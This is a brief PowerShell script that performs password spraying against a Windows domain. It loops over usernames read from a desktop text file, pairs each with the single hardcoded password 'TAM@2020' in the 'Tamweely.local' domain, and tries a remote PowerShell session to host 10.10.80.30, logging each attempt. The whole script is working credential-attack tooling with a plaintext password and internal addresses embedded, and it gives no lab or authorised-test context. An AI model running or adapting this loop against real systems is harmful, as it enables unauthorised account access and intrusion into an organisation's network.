$users = Get-Content C:\Users\MGabr\Desktop\tam@2020.users.txt

[securestring]$secStringPassword = ConvertTo-SecureString "TAM@2020" -AsPlainText -Force
$ErrorActionPreference = 'Continue'

foreach($user in $users){
    [pscredential]$credObject = New-Object System.Management.Automation.PSCredential ("Tamweely.local\$user", $secStringPassword)
    Write-Host -ForegroundColor Cyan "[*] Testing user $user"
    Enter-PSSession -ComputerName 10.10.80.30 -Credential $credObject
    pause
}